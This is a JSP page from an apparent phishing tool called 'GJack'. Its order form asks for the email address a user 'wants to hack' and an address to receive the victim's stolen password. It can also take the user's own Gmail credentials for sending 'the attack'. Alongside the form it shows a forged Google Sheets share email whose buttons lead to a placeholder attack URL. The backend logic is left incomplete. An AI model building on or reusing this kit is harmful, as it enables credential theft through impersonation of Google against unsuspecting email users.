<%@ page import="com.theah64.gjack.database.Orders" %>
<%@ page import="com.theah64.webengine.utils.Form" %>
<%@ page import="com.theah64.webengine.utils.RandomString" %>
<%@ page import="com.theah64.webengine.utils.RequestException" %>
<html>
<head>
    <title>GJack</title>
    <link rel="shortcut icon" href="favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

    <script>
        $(document).ready(function () {

            $(".input_listener").on('keyup', function () {
                $($(this).data("target")).text($(this).val());
            });

            $("input#enable_sender_gmail").change(function () {
                $("input.gmail_credentials").prop('disabled', !this.checked);
            });


        });

    </script>
</head>
<body>
<div class="container">

    <div class="row">
        <div class="col-md-12">
            <h2>GJack</h2>
        </div>
    </div>

    <%
        try {
            final Form form = new Form(request, new String[]{
                    Orders.COLUMN_VICTIM_EMAIL,
                    Orders.COLUMN_USER_EMAIL/*
                    Orders.COLUMN_SHARED_BY,
                    Orders.COLUMN_DOC_TITLE,
                    Orders.COLUMN_DOC_URL,*/
            });
            if (form.isSubmitted()) {

                /**
                 * id,
                 _key,
                 victim_email,
                 user_email,
                 shared_by
                 doc_title,
                 doc_url,
                 is_read,
                 content,
                 created_at
                 */


                final String key = RandomString.get(10);
                final String victimEmail = form.getString(Orders.COLUMN_VICTIM_EMAIL);
                final String userEmail = form.getString(Orders.COLUMN_USER_EMAIL);
                final String sharedBy = form.getString(Orders.COLUMN_SHARED_BY, Orders.COLUMN_DEFAULT_SHARED_BY);
                


                throw new RequestException("Form not submitted");
            }

        } catch (RequestException e) {
            e.printStackTrace();

    %>
    <p class="text-danger"><%=e.getMessage()%>
    </p>
    <%
        }
    %>

    <div class="row">

        <div class="col-md-4">
            <form action="order.jsp" method="POST">


                <%--Victim email--%>
                <div class="form-group">
                    <label for="victim_email">I want to hack </label>
                    <input id="victim_email" name="victim_email" type="email"
                           placeholder="Victim's email address" class="form-control"
                           required/>
                </div>


                <%--My email--%>
                <div class="form-group">
                    <label for="user_email">and send me the password to </label>
                    <input id="user_email" name="user_email" type="email" placeholder="Your email address"
                           class="form-control"
                           required/>
                </div>

                <%--Content name--%>
                <div class="form-group">
                    <label for="content_name">You can use this name in the mail </label>
                    <input id="content_name" name="content_name" type="text" placeholder="Any name" value="John"
                           class="form-control input_listener"
                           data-target="a#a_content_name"
                           required/>
                </div>


                <%--Document title--%>
                <div class="form-group">
                    <label for="doc_title">Document title should be</label>
                    <input id="doc_title" name="doc_title" type="text" placeholder="Document title" value="Report"
                           class="form-control input_listener"
                           data-target="a#a_doc_title"
                           required/>
                </div>

                <%--Custom doc url--%>
                <div class="form-group">
                    <label for="doc_url">Redirect to this google document</label>
                    <input id="doc_url" name="doc_url" type="text" placeholder="Valid google doc URL"
                           value="https://docs.google.com/spreadsheets/d/1shEpADXr7CTQMXEF9TE-xydAbmG3EfpRqCmMhYgBuQY/edit?usp=sharing"
                           class="form-control"
                           required/>
                </div>

                <%--Enable my gmail account--%>
                <div class="form-group">
                    <input id="enable_sender_gmail" name="enable_sender_gmail" type="checkbox"/>
                    <label for="enable_sender_gmail">Send the attack from my gmail</label>

                </div>

                <%--Gmail username--%>
                <div class="form-group">
                    <label for="sender_gmail">GMail username</label>
                    <input id="sender_gmail" type="email" name="sender_gmail" class="form-control gmail_credentials"
                           placeholder="Enter your gmail address" disabled/>
                </div>

                <%--Gmail password--%>
                <div class="form-group">
                    <label for="sender_gmail_password">GMail password</label>
                    <input id="sender_gmail_password" type="password" name="sender_gmail_password"
                           class="form-control gmail_credentials"
                           placeholder="Enter your gmail password" disabled/>
                </div>


                <div class="form-group">
                    <input class="btn btn-primary" name="is_submitted" type="submit" value="Send"/>
                </div>

            </form>
        </div>

        <div class="col-md-8">
            <div style="width: 100%;padding: 24px 0 16px 0;background-color: #f5f5f5;text-align: center">
                <div style="display: inline-block;width: 90%;max-width: 680px;min-width: 280px;text-align: left;font-family: Roboto,Arial,Helvetica,sans-serif">
                    <div style="height: 0px" dir="ltr"></div>
                    <div style="display: block;padding: 0 2px">
                        <div style="display: block;background: #fff;height: 2px"></div>
                    </div>
                    <div style="border-left: 1px solid #f0f0f0;border-right: 1px solid #f0f0f0">
                        <div style="padding: 24px 32px 24px 32px;background: #fff;border-right: 1px solid #eaeaea;border-left: 1px solid #eaeaea"
                             dir="ltr">
                            <div style="font-size: 14px;line-height: 18px;color: #444"><a
                                    id="a_content_name"
                                    href="mailto:john@gmail.com" style="color: inherit;text-decoration: none"
                                    target="_blank" tabindex="-1" rel="external">John</a> has shared a link to
                                the following spreadsheet:
                            </div>
                            <div style="height: 10px"></div>
                            <div style="font-size: 18px;display: table">
                                <div style="display: table-row;border-bottom: 4px solid #fff"><span
                                        style="display: table-cell"><div style="height: 32px"><img
                                        aria-label="Spreadsheet" style="vertical-align: middle;max-width: 24px"
                                        src="https://ssl.gstatic.com/docs/documents/share/images/services/spreadsheet-4.png"></div></span><span
                                        style="display: table-cell;padding-left: 12px"><a
                                        href="ATTACK_URL"
                                        id="a_doc_title"
                                        style="color: #3367d6;text-decoration: none;vertical-align: middle"
                                        target="_blank" tabindex="-1" rel="external">Report</a><div
                                        itemprop="action" itemscope=""
                                        itemtype="http://schema.org/ViewAction"></div></span></div>
                            </div>
                            <div style="height: 32px"></div>
                            <div>
                                <a href="ATTACK_URL"
                                   target="_blank"
                                   style="background-color: #4d90fe;border: 1px solid #3079ed;border-radius: 2px;color: white;display: inline-block;font-family: Roboto,Arial,Helvetica,sans-serif;font-size: 11px;font-weight: bold;height: 29px;line-height: 29px;min-width: 54px;outline: 0px;padding: 0 8px;text-align: center;text-decoration: none"
                                   tabindex="-1" rel="external">Open in Sheets</a></div>
                        </div>
                    </div>
                    <table style="width: 100%;border-collapse: collapse" role="presentation">
                        <tbody>
                        <tr>
                            <td style="padding: 0px">
                                <table style="border-collapse: collapse;width: 3px" role="presentation">
                                    <tbody>
                                    <tr height="1">
                                        <td width="1" style="padding: 0px;background-color: #f0f0f0"></td>
                                        <td width="1" style="padding: 0px;background-color: #eaeaea"></td>
                                        <td width="1" style="padding: 0px;background-color: #e5e5e5"></td>
                                    </tr>
                                    <tr height="1">
                                        <td width="1" style="padding: 0px;background-color: #f0f0f0"></td>
                                        <td width="1" style="padding: 0px;background-color: #eaeaea"></td>
                                        <td width="1" style="padding: 0px;background-color: #eaeaea"></td>
                                    </tr>
                                    <tr height="1">
                                        <td width="1" style="padding: 0px;background-color: #f5f5f5"></td>
                                        <td width="1" style="padding: 0px;background-color: #f0f0f0"></td>
                                        <td width="1" style="padding: 0px;background-color: #f0f0f0"></td>
                                    </tr>
                                    </tbody>
                                </table>
                            </td>
                            <td style="width: 100%;padding: 0px">
                                <div style="height: 1px;width: auto;border-top: 1px solid #ddd;background: #eaeaea;border-bottom: 1px solid #f0f0f0"></div>
                            </td>
                            <td style="padding: 0px">
                                <table style="border-collapse: collapse;width: 3px" role="presentation">
                                    <tbody>
                                    <tr height="1">
                                        <td width="1" style="padding: 0px;background-color: #e5e5e5"></td>
                                        <td width="1" style="padding: 0px;background-color: #eaeaea"></td>
                                        <td width="1" style="padding: 0px;background-color: #f0f0f0"></td>
                                    </tr>
                                    <tr height="1">
                                        <td width="1" style="padding: 0px;background-color: #eaeaea"></td>
                                        <td width="1" style="padding: 0px;background-color: #eaeaea"></td>
                                        <td width="1" style="padding: 0px;background-color: #f0f0f0"></td>
                                    </tr>
                                    <tr height="1">
                                        <td width="1" style="padding: 0px;background-color: #f0f0f0"></td>
                                        <td width="1" style="padding: 0px;background-color: #f0f0f0"></td>
                                        <td width="1" style="padding: 0px;background-color: #f5f5f5"></td>
                                    </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                    <table style="padding: 14px 10px 0 10px" role="presentation" dir="ltr">
                        <tbody>
                        <tr>
                            <td style="width: 100%;font-size: 11px;font-family: Roboto,Arial,Helvetica,sans-serif;color: #646464;line-height: 20px;min-height: 40px;vertical-align: middle">
                                Google Sheets: Create and edit spreadsheets online. <br>Gooogle Inc. 1600 Amphitheatre
                                Parkway, Mountain View, CA 94043, USA<br> You have received this email because someone
                                shared a spreadsheet with you from Google Sheets.
                            </td>
                            <td style="padding-left: 20px;vertical-align: middle"><a href="https://drive.google.com"
                                                                                     target="_blank" tabindex="-1"
                                                                                     rel="external"><img width="96"
                                                                                                         alt="Logo for Google Sheets"
                                                                                                         border="0"
                                                                                                         src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_tm_black54_color_96x40dp.png"></a>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

    </div>


</div>
</body>
</html>



